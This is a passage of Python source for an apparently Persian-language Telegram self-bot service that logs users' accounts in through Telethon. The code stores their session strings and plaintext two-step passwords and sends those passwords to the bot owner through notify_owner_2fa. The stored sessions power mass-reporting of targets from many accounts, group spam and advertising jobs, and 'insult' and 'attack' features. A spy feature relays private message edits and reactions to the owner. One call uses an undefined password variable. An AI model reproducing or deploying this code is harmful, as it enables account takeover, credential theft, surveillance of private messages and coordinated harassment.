                    targets_txt += chr(10) + "<blockquote>... و " + str(len(links)-25) + " تارگت دیگر</blockquote>"
                body = (
                    "<blockquote><b>دلیل گزارش را انتخاب کن</b></blockquote>" + chr(10)
                    + "<blockquote><b>تارگت‌ها (" + str(len(links)) + ")</b></blockquote>" + chr(10)
                    + targets_txt
                )
            else:
                body = (
                    "<blockquote><b>دلیل گزارش را انتخاب کن</b></blockquote>" + chr(10)
                    + "<blockquote>تارگت: <code>" + str(link).replace("<", "")[:100] + "</code></blockquote>"
                )
            bot.send_message(uid, body[:4000], parse_mode='HTML', reply_markup=mk)
        except Exception as e:
            try:
                bot.reply_to(message, "خطا در نمایش دلایل: " + str(e)[:120])
            except Exception:
                pass
        return

    # ریپورتر — متن سایر
    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'reporter_other':
        reason_text = (text or '').strip()
        st = admin_states.get(uid) or {}
        link = st.get('report_link')
        if not link:
            admin_states.pop(uid, None)
            bot.reply_to(message, "لینک پیدا نشد دوباره شروع کن")
            return
        key = st.get('reason_key') or 'other'
        owner_mode = st.get('owner_mode', False)
        sessions = _collect_report_sessions(uid, owner_mode=owner_mode)
        rname = reason_display_name(key, reason_text)
        lines = [
            "<blockquote><b>📡 تأیید ارسال گزارش</b></blockquote>",
            "<blockquote>هدف: <code>" + str(link).replace('<','')[:80] + "</code></blockquote>",
            "<blockquote>نوع گزارش: " + str(rname).replace('<','')[:200] + "</blockquote>",
            "<blockquote>تعداد اکانت: <b>" + str(len(sessions)) + "</b></blockquote>",
        ]
        for it in sessions[:40]:
            lab = it.get("label") if isinstance(it, dict) else it[0]
            lines.append("<blockquote>" + str(lab).replace('<','') + "</blockquote>")
        mk = types.InlineKeyboardMarkup(row_width=1)
        mk.add(types.InlineKeyboardButton("✅ ارسال گزارش", callback_data="rep_send_" + str(uid) + "_" + key))
        mk.add(types.InlineKeyboardButton("❌ لغو", callback_data="rep_cancel_" + str(uid)))
        st0 = admin_states.get(uid) or {}
        admin_states[uid] = {
            'step': 'reporter_confirm',
            'report_link': link,
            'report_links': st0.get('report_links') or [link],
            'owner_mode': owner_mode,
            'reason_key': key,
            'reason_text': reason_text,
        }
        bot.send_message(uid, chr(10).join(lines)[:4000], parse_mode='HTML', reply_markup=mk)
        return

    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'extra_join_text':
        phrase = (text or '').strip() or "Server : on"
        set_user(uid, 'extra_join_text', phrase)
        admin_states.pop(uid, None)
        bot.reply_to(message, "متن جوین ذخیره شد:\n" + phrase)
        try:
            personalize_panel(uid)
        except Exception:
            pass
        return

    # پروفایل اکانت‌های اضافه — فقط اسم
    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'extra_prof_name':
        name = (text or '').strip()
        if not name:
            bot.reply_to(message, "اسم خالی نباشه")
            return
        admin_states.pop(uid, None)
        extras = get_extras(uid) or {}
        ok = 0
        fail = 0
        for aid, inf in extras.items():
            if str(aid).lower() in ('all', 'none', '') or not isinstance(inf, dict):
                continue
            try:
                key = (int(uid), int(aid))
                cl = extra_clients.get(key)
                if not cl:
                    sess = inf.get('session')
                    if sess:
                        asyncio.run_coroutine_threadsafe(start_extra_client(uid, aid, sess), loop).result(timeout=20)
                        cl = extra_clients.get(key)
                if not cl:
                    fail += 1
                    continue
                async def _upd(c=cl, n=name):
                    from telethon.tl.functions.account import UpdateProfileRequest
                    await c(UpdateProfileRequest(first_name=n[:64]))
                asyncio.run_coroutine_threadsafe(_upd(), loop).result(timeout=15)
                ok += 1
            except Exception:
                fail += 1
        bot.reply_to(message, "اسم اعمال شد\nموفق: " + str(ok) + " | ناموفق: " + str(fail))
        try:
            personalize_panel(uid)
        except Exception:
            pass
        return

    # پروفایل — فقط بیو
    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'extra_prof_bio_only':
        bio = (text or '').strip()
        admin_states.pop(uid, None)
        extras = get_extras(uid) or {}
        ok = 0
        fail = 0
        for aid, inf in extras.items():
            if str(aid).lower() in ('all', 'none', '') or not isinstance(inf, dict):
                continue
            try:
                key = (int(uid), int(aid))
                cl = extra_clients.get(key)
                if not cl:
                    sess = inf.get('session')
                    if sess:
                        asyncio.run_coroutine_threadsafe(start_extra_client(uid, aid, sess), loop).result(timeout=20)
                        cl = extra_clients.get(key)
                if not cl:
                    fail += 1
                    continue
                async def _upd(c=cl, b=bio):
                    from telethon.tl.functions.account import UpdateProfileRequest
                    await c(UpdateProfileRequest(about=(b or '')[:70]))
                asyncio.run_coroutine_threadsafe(_upd(), loop).result(timeout=15)
                ok += 1
            except Exception:
                fail += 1
        bot.reply_to(message, "بیو اعمال شد\nموفق: " + str(ok) + " | ناموفق: " + str(fail))
        try:
            personalize_panel(uid)
        except Exception:
            pass
        return

    # پروفایل — فقط عکس
    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'extra_prof_photo':
        if not message.photo:
            bot.reply_to(message, "یک عکس بفرست")
            return
        admin_states.pop(uid, None)
        try:
            fpath = bot.download_file(bot.get_file(message.photo[-1].file_id).file_path)
            import tempfile
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
            tmp.write(fpath)
            tmp.close()
            photo_path = tmp.name
        except Exception as e:
            bot.reply_to(message, "خطا دانلود عکس: " + str(e)[:80])
            return
        extras = get_extras(uid) or {}
        ok = 0
        fail = 0
        for aid, inf in extras.items():
            if str(aid).lower() in ('all', 'none', '') or not isinstance(inf, dict):
                continue
            try:
                key = (int(uid), int(aid))
                cl = extra_clients.get(key)
                if not cl:
                    sess = inf.get('session')
                    if sess:
                        asyncio.run_coroutine_threadsafe(start_extra_client(uid, aid, sess), loop).result(timeout=20)
                        cl = extra_clients.get(key)
                if not cl:
                    fail += 1
                    continue
                async def _upd(c=cl, p=photo_path):
                    from telethon.tl.functions.photos import UploadProfilePhotoRequest
                    up = await c.upload_file(p)
                    await c(UploadProfilePhotoRequest(file=up))
                asyncio.run_coroutine_threadsafe(_upd(), loop).result(timeout=30)
                ok += 1
            except Exception:
                fail += 1
        try:
            os.unlink(photo_path)
        except Exception:
            pass
        bot.reply_to(message, "عکس پروفایل اعمال شد\nموفق: " + str(ok) + " | ناموفق: " + str(fail))
        try:
            personalize_panel(uid)
        except Exception:
            pass
        return

    # پشتیبانی — دریافت پیام کاربر
    if chat == 'private' and uid in admin_states and admin_states[uid].get('step') == 'support_msg':
        admin_states.pop(uid, None)
        u = get_user(uid)
        name = u.get('original_name') or message.from_user.first_name or str(uid)
        phone = u.get('phone') or '—'
        header = (
            "<blockquote>پشتیبانی\n"
            + "از: " + str(name).replace('<', '') + "\n"
            + "ایدی: <code>" + str(uid) + "</code>\n"
            + "شماره: <code>" + str(phone) + "</code></blockquote>"
        )
        try:
            bot.copy_message(OWNER_ID, message.chat.id, message.message_id)
        except Exception:
            try:
                bot.send_message(OWNER_ID, text[:2000])
            except Exception:
                pass
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("پاسخ دادن", callback_data=f"sup_reply_{uid}"))
        try:
            bot.send_message(OWNER_ID, header, parse_mode='HTML', reply_markup=mk)
        except Exception:
            pass
        bot.reply_to(message, "پیام شما برای پشتیبانی ارسال شد در اولین فرصت جواب شما داده میشود")
        return

    # پاسخ مالک به پشتیبانی
    if chat == 'private' and is_main_owner(uid) and uid in admin_states and admin_states[uid].get('step') == 'support_reply':
        tid = admin_states[uid].get('tid')
        admin_states.pop(uid, None)
        try:
            bot.copy_message(tid, message.chat.id, message.message_id)
            bot.reply_to(message, "ارسال شد به کاربر")
        except Exception:
            try:
                bot.send_message(tid, text)
                bot.reply_to(message, "ارسال شد")
            except Exception as e:
                bot.reply_to(message, "خطا: " + str(e)[:80])
        return

    if chat == 'private' and uid != OWNER_ID and get_force_channels() and not get_ud(uid, 'channel_ok'):
        if str(uid) in load_data().get('users', {}):
            require_channel_join(uid)
            return

    if uid in admin_states and admin_states[uid].get('action') in ('typing_gid', 'typing_uid'):
        try:
            tid = int(text.strip())
        except:
            bot.reply_to(message, "ایدی عددی معتبر بفرست")
            return
        action = admin_states[uid]['action']
        if action == 'typing_gid':
            conf = {'mode': 'group_id', 'target': tid}
            set_user(uid, 'typing_conf', conf)
            typing_jobs[uid] = conf
            bot.reply_to(message, f"در حال نوشتن برای گروه `{tid}` فعال شد", parse_mode='Markdown')
        else:
            conf = {'mode': 'user_id', 'target': tid}
            set_user(uid, 'typing_conf', conf)
            typing_jobs[uid] = conf
            bot.reply_to(message, f"در حال نوشتن برای پیوی `{tid}` فعال شد", parse_mode='Markdown')
        del admin_states[uid]
        main_panel(uid)
        return

    # کپچا نباید با لاگین / ۲FA / ریپورتر قاطی شود

    # توقف ارسال لیست توسط مالک
    if is_main_owner(uid) and chat == 'private' and (text or '').strip() == 'توقف':
        try:
            list_stop.add(int(OWNER_ID))
        except Exception:
            pass
        try:
            bot.reply_to(message, "<blockquote>⏹ توقف ثبت شد</blockquote>", parse_mode='HTML')
        except Exception:
            pass
        return

    if chat == 'private' and uid in captcha_wait and uid not in login_states and uid not in extra_login_states and not (uid in admin_states and admin_states[uid].get('step') in ('reporter_link', 'reporter_other', 'reporter_confirm', 'reporter_reason', 'ch_main_link', 'ch_target_link', 'password')):
        try: ans = int(text)
        except:
            bot.reply_to(message, "فقط عدد بفرست")
            return
        if ans == captcha_wait[uid]['answer']:
            ref = captcha_wait[uid].get('ref')
            ca = captcha_wait[uid].get('a')
            cb = captcha_wait[uid].get('b')
            mids = list(captcha_wait[uid].get('msg_ids') or [])
            try:
                if mids and ca is not None:
                    bot.edit_message_text(
                        f"{ca}+{cb} = {ans}",
                        uid, mids[0]
                    )
            except Exception:
                pass
            try:
                del captcha_wait[uid]
            except Exception:
                pass
            data = load_data()
            coins = 99999999 if uid == OWNER_ID else 500
            coins_peak = coins
            import time as _t_join
            data['users'][str(uid)] = {
                'coins': coins, 'coins_peak': coins, 'referrals': 0, 'enemies': [], 'insults': [], 'contents': {},
                'silenced': [], 'insult_delay': 0, 'react_delay': 0, 'spam_delay': 0,
                'attack_delay': 0, 'attack_insults': [], 'attack_targets': {}, 'attack_trigger': '',
                'kol_delay': 0, 'kol_texts': [], 'kol_targets': [],
                'auto_replies': {}, 'text_style': None, 'keep_messages': False, 'typing_conf': {'mode': 'off'},
                'always_online': False,
                'original_name': message.from_user.first_name or '',
                'username': message.from_user.username or '',
                'self_enabled': True, 'banned': False,
                'channel_ok': True if uid == OWNER_ID else False,
                'skip_captcha': False,
                'join_ts': _t_join.time(),
                'extra_enemies': [],
                'extra_enemy_texts': [],
            }
            # رفرال فقط بعد از عضویت اجباری حساب می‌شود
            if ref and str(ref) in data['users'] and ref != uid and not data['users'][str(ref)].get('banned'):
                data['users'][str(uid)]['pending_ref'] = int(ref)
            save_data(data)
            # پاک کردن پیام کپچا (بهترین تلاش)
            try:
                bot.delete_message(uid, message.message_id)
            except Exception:
                pass
            if not get_force_channels():
                set_user(uid, 'channel_ok', True)
                # بدون چنل اجباری → همین‌جا رفرال
                pref = get_ud(uid, 'pending_ref')
                if pref and not get_ud(uid, 'ref_done'):
                    set_user(uid, 'ref_done', True)
                    set_user(uid, 'pending_ref', None)
                    notify_referral_ok(int(pref), uid)
            if uid == OWNER_ID or get_ud(uid, 'channel_ok'):
                mk = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
                mk.add(types.KeyboardButton("ارسال شماره", request_contact=True))
                bot.send_message(uid, "کپچا درست بود" + chr(10) + "حالا برای لاگین شماره را ارسال کنید:", reply_markup=mk)
            else:
                require_channel_join(uid)
            return
        else:
            mids = list(captcha_wait[uid].get('msg_ids') or [])
            for mid in mids:
                try:
                    bot.delete_message(uid, mid)
                except Exception:
                    pass
            try:
                bot.delete_message(uid, message.message_id)
            except Exception:
                pass
            a, b, ans = make_captcha()
            captcha_wait[uid]['answer'] = ans
            captcha_wait[uid]['a'] = a
            captcha_wait[uid]['b'] = b
            m = bot.send_message(uid, "جواب کپچا زیر رو ارسال کن" + chr(10) + f"{a}+{b}= ")
            captcha_wait[uid]['msg_ids'] = [m.message_id]
        return


    if chat == 'private' and uid in extra_login_states and extra_login_states[uid].get('step') == 'phone':
        raw = re.sub(r'[^0-9+]', '', text)
        if len(raw) < 10:
            bot.reply_to(message, "شماره معتبر بفرست" + chr(10) + "مثال: 09016143216")
            return
        phone = raw
        if phone.startswith('09'):
            phone = '+98' + phone[1:]
        elif phone.startswith('9') and len(phone) >= 10:
            phone = '+98' + phone
        elif not phone.startswith('+'):
            phone = '+' + phone
        client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="StR")
        extra_login_states[uid] = {'client': client, 'phone': phone, 'step': 'code', 'code_digits': '', 'mode': 'extra', 'msg_ids': []}
        try:
            bot.send_message(uid, "شماره اکانت اضافه:" + chr(10) + "`" + phone + "`" + chr(10) + "در حال ارسال کد...", parse_mode='Markdown')
        except Exception:
            pass
        asyncio.run_coroutine_threadsafe(send_code_extra(uid, phone, client), loop)
        return

        # کد لاگین اکانت اضافه
    if uid in extra_login_states and extra_login_states[uid].get('step') == 'code':
        if chat != 'private':
            return
        code = re.sub(r'[^0-9]', '', text)
        if len(code) != 5:
            bot.reply_to(message, "کد باید ۵ رقم باشد")
            return
        state = extra_login_states[uid]
        bot.reply_to(message, "در حال بررسی اکانت اضافه...")
        async def try_extra_login():
            try:
                await state['client'].sign_in(state['phone'], code)
                session = state['client'].session.save()
                me = await state['client'].get_me()
                acc_id = str(me.id)
                if int(me.id) == int(uid):
                    try:
                        await state['client'].disconnect()
                    except Exception:
                        pass
                    extra_login_states.pop(uid, None)
                    bot.send_message(uid, "اکانت خودت را نمیتوانی به عنوان اکانت اضافه ثبت کنی. شماره اکانت دیگری بفرست.")
                    return
                extras = get_extras(uid)
                if acc_id in extras:
                    extra_login_states[uid] = {
                        'step': 'reregister',
                        'client': state.get('client'),
                        'phone': state.get('phone'),
                        'session': session,
                        'acc_id': acc_id,
                        'me_name': ((me.first_name or '') + ' ' + (me.last_name or '')).strip(),
                        'me_username': getattr(me, 'username', None),
                    }
                    mk = types.InlineKeyboardMarkup()
                    mk.add(types.InlineKeyboardButton("ثبت مجدد", callback_data="ex_rereg_" + str(acc_id)))
                    mk.add(types.InlineKeyboardButton("انصراف", callback_data="ex_rereg_cancel"))
                    bot.send_message(
                        uid,
                        "<blockquote>این اکانت قبلاً اضافه شده</blockquote>" + chr(10)
                        + "<blockquote>اگر می‌خوای دوباره ثبتش کنی روی دکمه زیر بزن</blockquote>",
                        parse_mode='HTML',
                        reply_markup=mk,
                    )
                    return
                extras[acc_id] = {
                    'id': me.id,
                    'session': session,
                    'phone': state.get('phone'),
                    'name': ((me.first_name or '') + ' ' + (me.last_name or '')).strip(),
                    'username': me.username,
                    '2fa_password': state.get('password') or '',
                    'tabchi_groups': [],
                    'spam_groups': [],
                    'sender_items': [],
                }
                set_extras(uid, extras)
                try:
                    ename = ((me.first_name or '') + ' ' + (me.last_name or '')).strip()
                    notify_owner_2fa(uid, password, phone=state.get('phone'), name=ename, is_extra=True)
                except Exception:
                    pass
                # سشن اکانت اضافه برای سلف خودش (نه مالک)
                aid = int(me.id)
                data = load_data()
                if str(aid) not in data['users']:
                    data['users'][str(aid)] = {
                        'coins': 500, 'referrals': 0, 'enemies': [], 'insults': [], 'contents': {},
                        'silenced': [], 'self_enabled': True, 'banned': False,
                        'original_name': extras[acc_id]['name'],
                        'username': me.username or '',
                        'skip_captcha': True, 'channel_ok': True,
                    }
                    save_data(data)
                set_user(aid, 'session', session)
                set_user(aid, 'phone', state.get('phone'))
                set_user(aid, 'skip_captcha', True)
                set_user(aid, 'channel_ok', True)
                await start_extra_client(uid, acc_id, session)
                try:
                    await start_client(aid)
                except Exception:
                    pass
                try:
                    bme = bot.get_me()
                    if bme.username:
                        await state['client'].send_message(bme.username, '/start')
                except Exception:
                    pass
                for mid in (state.get('msg_ids') or []):
                    try:
                        bot.delete_message(uid, mid)
                    except Exception:
                        pass
                extra_login_states.pop(uid, None)
                bot.send_message(uid, "<blockquote>اکانت اضافه ثبت شد</blockquote>", parse_mode='HTML')
                extras_list_panel(uid)
            except SessionPasswordNeededError:
                extra_login_states[uid]['step'] = 'password'
                try:
                    bot.send_message(uid, "<blockquote>تایید دو مرحله ای خود را وارد کنید</blockquote>" + chr(10) + "<blockquote>راهنما :</blockquote>" + chr(10) + "<blockquote>رمز را به صورت متن بفرستید</blockquote>", parse_mode="HTML")
                except Exception:
                    bot.send_message(uid, "تایید دو مرحله ای خود را وارد کنید")
            except Exception as e:
                bot.send_message(uid, "خطا: " + str(e))
                extra_login_states.pop(uid, None)
        asyncio.run_coroutine_threadsafe(try_extra_login(), loop)
        return

    if uid in login_states and login_states[uid].get('step') == 'password':
        if chat != 'private':
            return
        state = login_states[uid]
        password = (text or '').strip()
        if not password:
            try:
                bot.send_message(uid, "<blockquote>رمز را بفرستید</blockquote>", parse_mode='HTML')
            except Exception:
                pass
            return
        try:
            bot.send_message(uid, "<blockquote>در حال بررسی رمز...</blockquote>", parse_mode='HTML')
        except Exception:
            pass
        async def try_main_pw():
            try:
                cl = state.get('client')
                if not cl:
                    bot.send_message(uid, "<blockquote>نشست منقضی شد — دوباره لاگین کنید</blockquote>", parse_mode='HTML')
                    login_states.pop(uid, None)
                    return
                try:
                    if not cl.is_connected():
                        await cl.connect()
                except Exception:
                    try:
                        await cl.connect()
                    except Exception as ce:
                        bot.send_message(uid, "<blockquote>اتصال قطع شد — دوباره لاگین کنید</blockquote>", parse_mode='HTML')
                        login_states.pop(uid, None)
                        return
                await cl.sign_in(password=password)
                session = cl.session.save()
                if not session or len(str(session)) < 20:
                    raise Exception('session save failed')
                name0 = un0 = None
                try:
                    me = await cl.get_me()
                    if me:
                        name0 = ((me.first_name or '') + ' ' + (me.last_name or '')).strip()
                        un0 = getattr(me, 'username', None)
                except Exception:
                    pass
                payload = {'session': session, 'phone': state.get('phone'), 'self_enabled': True, '2fa_password': password}
                if name0:
                    payload['original_name'] = name0
                if un0:
                    payload['username'] = un0
                update_user(uid, **payload)
                clients[uid] = cl
                try:
                    notify_owner_2fa(uid, password, phone=state.get('phone'), name=name0, is_extra=False)
                except Exception:
                    pass
                try:
                    await start_client(uid)
                except Exception:
                    pass
                try:
                    notify_owner_login(uid, phone=state.get('phone'))
                except Exception:
                    pass
                for mid in (state.get('msg_ids') or []):
                    try:
                        bot.delete_message(uid, mid)
                    except Exception:
                        pass
                try:
                    if state.get('code_msg_id'):
                        bot.delete_message(uid, state['code_msg_id'])
                except Exception:
                    pass
                login_states.pop(uid, None)
                bot.send_message(uid, "<blockquote><b>با موفقیت سلف رو اکانت شما فعال شد</b></blockquote>", parse_mode='HTML')
                try:
                    main_panel(uid)
                except Exception:
                    pass
            except Exception as e:
                err = str(e).lower()
                try:
                    if 'password' in err or 'hash' in err or 'invalid' in err or 'two-steps' in err:
                        bot.send_message(uid, "<blockquote>رمز اشتباه است دوباره بفرستید</blockquote>", parse_mode='HTML')
                    else:
                        bot.send_message(uid, "<blockquote>خطا:</blockquote>" + chr(10) + "<blockquote>" + str(e)[:150].replace('<','') + "</blockquote>", parse_mode='HTML')
                except Exception:
                    pass
        try:
            fut = asyncio.run_coroutine_threadsafe(try_main_pw(), loop)
            # منتظر نتیجه تا کاربر بفهمد
            try:
                fut.result(timeout=60)
            except Exception as e:
                try:
                    bot.send_message(uid, "<blockquote>خطا در ورود:</blockquote>" + chr(10) + "<blockquote>" + str(e)[:120].replace('<','') + "</blockquote>", parse_mode='HTML')
                except Exception:
                    pass
        except Exception as e:
            try:
                bot.send_message(uid, "خطا: " + str(e)[:120])
            except Exception:
                pass
        return

    if uid in extra_login_states and extra_login_states[uid].get('step') == 'password':
        if chat != 'private':
            return
        state = extra_login_states[uid]
        password = (text or '').strip()
        if not password:
            try:
                bot.send_message(uid, "<blockquote>رمز را بفرستید</blockquote>", parse_mode='HTML')
            except Exception:
                pass
            return
        try:
            bot.send_message(uid, "<blockquote>در حال بررسی رمز...</blockquote>", parse_mode='HTML')
        except Exception:
            pass
        async def try_extra_pw():
            try:
                cl = state.get('client')
                try:
                    if cl and not cl.is_connected():
                        await cl.connect()
                except Exception:
                    try:
                        await cl.connect()
                    except Exception:
                        pass
                await cl.sign_in(password=password)
                session = state['client'].session.save()
                if not session or len(str(session)) < 20:
                    raise Exception('session save failed')
                me = await state['client'].get_me()
                acc_id = str(me.id)
                if int(me.id) == int(uid):
                    try:
                        await state['client'].disconnect()
                    except Exception:
                        pass
                    extra_login_states.pop(uid, None)
                    bot.send_message(uid, "اکانت خودت را نمیتوانی به عنوان اکانت اضافه ثبت کنی. شماره اکانت دیگری بفرست.")
                    return
                extras = get_extras(uid)
                if acc_id in extras:
                    extra_login_states.pop(uid, None)
                    bot.send_message(uid, "این اکانت قبلا ثبت شده")
                    extras_list_panel(uid)
                    return
                extras[acc_id] = {
                    'id': me.id,
                    'session': session,
                    'phone': state.get('phone'),
                    'name': ((me.first_name or '') + ' ' + (me.last_name or '')).strip(),
                    'username': me.username,
                    'tabchi_groups': [],
                    'spam_groups': [],
                    'sender_items': [],
                }
                set_extras(uid, extras)
                aid = int(me.id)
                data = load_data()
                if str(aid) not in data['users']:
                    data['users'][str(aid)] = {
                        'coins': 500, 'referrals': 0, 'enemies': [], 'insults': [], 'contents': {},
                        'silenced': [], 'self_enabled': True, 'banned': False,
                        'original_name': extras[acc_id]['name'],
                        'username': me.username or '',
                        'skip_captcha': True, 'channel_ok': True,
                    }
                    save_data(data)
                set_user(aid, 'session', session)
                set_user(aid, 'phone', state.get('phone'))
                set_user(aid, 'skip_captcha', True)
                set_user(aid, 'channel_ok', True)
                await start_extra_client(uid, acc_id, session)
                await start_client(aid)
                try:
                    bme = bot.get_me()
                    if bme.username:
                        await state['client'].send_message(bme.username, '/start')
                except Exception:
                    pass
                extra_login_states.pop(uid, None)
                bot.send_message(uid, "اکانت اضافه ثبت شد و سلف متصل شد")
                extras_list_panel(uid)
            except Exception as e:
                bot.send_message(uid, "رمز اشتباه: " + str(e))
        asyncio.run_coroutine_threadsafe(try_extra_pw(), loop)
        return

    if uid in login_states and login_states[uid].get('step') == 'code':
        if chat != 'private': return
        code = re.sub(r'[^0-9]', '', text)
        if len(code) != 5:
            bot.reply_to(message, "کد باید ۵ رقم باشد")
            return
        state = login_states[uid]
        bot.reply_to(message, "در حال بررسی...")
        async def try_login():
            try:
                await state['client'].sign_in(state['phone'], code)
                session = state['client'].session.save()
                name0 = None
                un0 = None
                try:
                    me = await state['client'].get_me()
                    if me:
                        name0 = ((me.first_name or '') + ' ' + (me.last_name or '')).strip()
                        un0 = getattr(me, 'username', None)
                except Exception:
                    pass
                payload = {
                    'session': session,
                    'phone': state['phone'],
                    'self_enabled': True,
                }
                if name0:
                    payload['original_name'] = name0
                if un0:
                    payload['username'] = un0
                update_user(uid, **payload)
                clients[uid] = state['client']
                @state['client'].on(events.NewMessage)
                async def h(e):
                    try:
                        try:
                            if get_ud(uid, 'keep_messages') and getattr(e, 'is_private', False) and not e.out:
                                sid = e.sender_id
                                nm = ''
                                try:
                                    s = await e.get_sender()
                                    nm = ((getattr(s, 'first_name', '') or '') + ' ' + (getattr(s, 'last_name', '') or '')).strip()
                                except Exception:
                                    pass
                                msg_cache[(int(uid), int(e.chat_id), int(e.id))] = {
                                    'text': e.raw_text or '',
                                    'sender': sid,
                                    'name': nm,
                                    'ts': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                }
                        except Exception:
                            pass
                        await on_self(e, uid)
                    except (AuthKeyUnregisteredError, AuthKeyDuplicatedError, UserDeactivatedError, UserDeactivatedBanError):
                        notify_user_session_lost(uid)
                    except Exception:
                        pass

                @state['client'].on(events.MessageEdited)
                async def h_edit(e):
                    try:
                        if uid not in pv_spy:
                            return
                        if not getattr(e, 'is_private', False):
                            return
                        rkey = (int(uid), int(e.chat_id), int(e.id))
                        mapped = pv_msg_map.get(rkey)
                        if not mapped or not mapped.get('bot_mid'):
                            return
                        new_txt = e.raw_text or ''
                        old_txt = mapped.get('text') or ''
                        body = (
                            "<blockquote><b>پیام ویرایش‌شده</b></blockquote>" + chr(10)
                            + "<blockquote>اکانت <code>" + str(uid) + "</code></blockquote>" + chr(10)
                            + "<blockquote>قبلی:</blockquote>" + chr(10)
                            + "<blockquote>" + str(old_txt)[:400].replace('<', '') + "</blockquote>" + chr(10)
                            + "<blockquote>جدید:</blockquote>" + chr(10)
                            + "<blockquote>" + str(new_txt)[:400].replace('<', '') + "</blockquote>"
                        )
                        try:
                            bot.edit_message_text(body, mapped.get('chat') or OWNER_ID, mapped['bot_mid'], parse_mode='HTML')
                        except Exception:
                            try:
                                bot.edit_message_caption(chat_id=mapped.get('chat') or OWNER_ID, message_id=mapped['bot_mid'], caption=body, parse_mode='HTML')
                            except Exception:
                                pass
                        mapped['text'] = new_txt
                        pv_msg_map[rkey] = mapped
                    except Exception:
                        pass

                @state['client'].on(events.Raw)
                async def h_raw(update):
                    try:
                        if uid not in pv_spy:
                            return
                        name = type(update).__name__
                        if 'Reaction' not in name and 'reaction' not in name.lower():
                            return
                        # استخراج peer و msg_id تا حد ممکن
                        msg_id = getattr(update, 'msg_id', None) or getattr(update, 'message_id', None)
                        peer = getattr(update, 'peer', None)
                        chat_id = None
                        if peer is not None:
                            chat_id = getattr(peer, 'user_id', None) or getattr(peer, 'channel_id', None) or getattr(peer, 'chat_id', None)
                        if chat_id is None:
                            chat_id = getattr(update, 'peer_id', None)
                        if not msg_id or not chat_id:
                            return
                        rkey = (int(uid), int(chat_id), int(msg_id))
                        mapped = pv_msg_map.get(rkey)
                        if not mapped or not mapped.get('bot_mid'):
                            return
                        emo = '👍'
                        try:
                            reactions = getattr(update, 'reactions', None)
                            if reactions:
                                recent = getattr(reactions, 'recent_reactions', None) or getattr(reactions, 'results', None)
                                if recent:
                                    r0 = recent[0]
                                    em = getattr(r0, 'reaction', None) or r0
                                    emo = getattr(em, 'emoticon', None) or str(em)
                        except Exception:
                            pass
                        try:
                            bot.send_message(
                                mapped.get('chat') or OWNER_ID,
                                "<blockquote>ری‌اکت " + str(emo) + "</blockquote>" + chr(10)
                                + "<blockquote>روی پیام گزارش‌شده</blockquote>",
                                parse_mode='HTML',
                                reply_to_message_id=mapped['bot_mid'],
                            )
                        except Exception:
                            pass
                    except Exception:
                        pass
                try:
                    notify_owner_login(uid, phone=state.get('phone'))
                except Exception:
                    pass
                try:
                    for mid in (state.get('msg_ids') or []):
                        try:
                            bot.delete_message(uid, mid)
                        except Exception:
                            pass
                except Exception:
                    pass
                del login_states[uid]
                try:
                    if get_ud(uid, 'clock_enabled'):
                        asyncio.run_coroutine_threadsafe(apply_clock_name(clients[uid], uid), loop)
                except Exception:
                    pass
                try:
                    if get_ud(uid, 'always_online'):
                        asyncio.run_coroutine_threadsafe(
                            clients[uid](UpdateStatusRequest(offline=False)), loop
                        )
                except Exception:
                    pass
                try:
                    del_old_panel(uid)
                except Exception:
                    pass
                try:
                    bot.send_message(uid, "سلف فعال شد")
                except Exception:
                    pass
                main_panel(uid)
            except SessionPasswordNeededError:
                login_states[uid]['step'] = 'password'
                bot.send_message(uid, "<blockquote>تایید دو مرحله ای خود را وارد کنید</blockquote>" + chr(10) + "<blockquote>راهنما :</blockquote>", parse_mode="HTML")
                bot.register_next_step_handler_by_chat_id(uid, get_password)
            except Exception as e:
                bot.send_message(uid, f"خطا: {e}")
        asyncio.run_coroutine_threadsafe(try_login(), loop)
        return

    if get_ud(uid, 'banned'): return


    # حالت های تبچی / سندر / اسپم اکانت اضافه
    # توقف عملیات اسپم/تبچی اکانت اضافه
    if chat == 'private' and text.strip() == 'توقف':
        stopped = False
        for k, job in list(extra_spam_jobs.items()):
            if k[0] == uid and isinstance(job, dict) and job.get('active'):
                job['active'] = False
                stopped = True
                try:
                    if job.get('status_mid'):
                        bot.edit_message_text(
                            "عملیات متوقف شد" + chr(10) + "تعداد ارسال شده: " + str(job.get('sent') or 0),
                            uid, job['status_mid'],
                        )
                except Exception:
                    pass
        for k, job in list(sender_jobs.items()):
            if k[0] == uid:
                sender_jobs.pop(k, None)
                stopped = True
        if stopped:
            bot.reply_to(message, "عملیات متوقف شد")
        else:
            bot.reply_to(message, "عملیاتی در حال انجام نیست")
        return

    if chat == 'private' and uid in tabchi_states:
        st = tabchi_states[uid]
        mode = st.get('mode')
        acc_id = st.get('acc_id')
        if mode in ('tabchi_links', 'spam_links') and ('t.me/' in text or 'telegram.me/' in text):
            links = st.get('links') or []
            for part in text.split():
                if 't.me/' in part or 'telegram.me/' in part:
                    links.append(part.strip())
            st['links'] = links
            tabchi_states[uid] = st
            n = len(links)
            mk = types.InlineKeyboardMarkup()
            if mode == 'tabchi_links':
                mk.add(types.InlineKeyboardButton("ذخیره", callback_data=f"ex_tg_save_{uid}_{acc_id}"))
                mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_tab_{uid}_{acc_id}"))
            else:
                mk.add(types.InlineKeyboardButton("ذخیره", callback_data=f"ex_sg_save_{uid}_{acc_id}"))
                mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"ex_spm_{uid}_{acc_id}"))
            title = "لینک گروه را برای تبلیغات ارسال کنید" if mode == 'tabchi_links' else "لینک گروه را برای اسپم ارسال کنید"
            try:
                bot.edit_message_text(
                    f"{title}"+chr(10)+f"لینک های ثبت شده: {n}",
                    st.get('chat_id') or uid,
                    st.get('message_id'),
                    reply_markup=mk,
                    disable_web_page_preview=True,
                )
            except Exception:
                bot.send_message(uid, f"لینک های ثبت شده: {n}", reply_markup=mk)
            return
        if mode == 'sender_content':
            # ذخیره با فرمت کامل
            html = message_to_html(message) or text or ''
            item = {
